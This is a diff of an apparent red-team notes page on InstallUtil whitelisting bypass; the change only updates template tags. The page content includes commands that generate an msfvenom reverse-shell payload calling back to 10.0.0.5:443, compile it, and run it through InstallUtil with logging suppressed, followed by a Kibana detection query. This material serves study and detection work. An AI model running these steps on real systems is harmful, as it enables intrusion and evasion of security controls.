@@ -8,28 +8,28 @@ description: InstallUtil code execution - bypass application whitelisting.
 
 First of, let's generate a C\# payload \(with [InstallUtil script](https://github.com/khr0x40sh/WhiteListEvasion)\) that contains shellcode from msfvenom and upload the temp.cs file to victim's machine:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@local" %}
+{% tabs %}
+{% tab title="attacker@local" %}
 ```csharp
 python InstallUtil.py --cs_file temp.cs --exe_file temp.exe --payload windowsreverse_shell_tcp --lhost 10.0.0.5 --lport 443
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Compile the .cs to an .exe:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\csc.exe C:\experiments\installUtil\temp.cs
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Execute the payload:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 PS C:\Windows\Microsoft.NET\Framework\v4.0.30319> .\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
 Microsoft (R) .NET Framework Installation utility Version 4.0.30319.17929
@@ -37,8 +37,8 @@ Copyright (C) Microsoft Corporation.  All rights reserved.
 
 Hello From Uninstall...I carry out the real work...
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Enjoy the sweet reverse shell:
 
@@ -52,13 +52,13 @@ Look for `InstallUtil` processes that have established connections, especially t
 
 A very primitive query in kibana allowing to find events where InstallUtil spawns cmd:
 
-{% code-tabs %}
-{% code-tabs-item title="kibana" %}
+{% tabs %}
+{% tab title="kibana" %}
 ```text
 event_data.ParentCommandLine:"*installutil.exe*" && event_data.Image:cmd.exe
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![InstallUtil launching the malicious payload](../../.gitbook/assets/installutil-kibana.png)
 
